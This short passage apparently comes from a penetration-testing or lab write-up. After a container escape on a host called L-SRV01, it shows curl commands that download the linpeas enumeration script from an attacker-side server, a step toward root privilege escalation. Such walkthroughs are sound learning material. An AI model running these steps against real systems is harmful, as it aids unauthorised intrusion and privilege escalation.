
We have shell on L-SRV01 and escaped the container, we need to perform
local privilege escalation to gain root on the box.

Will download the linpeas script using the curl command.
```
curl -O http://10.50.104.169:8080/linpeas.sh
```


or save a file with specific name
```
curl -o enum.sh  http://10.50.104.169:8080/linpeas.sh
```

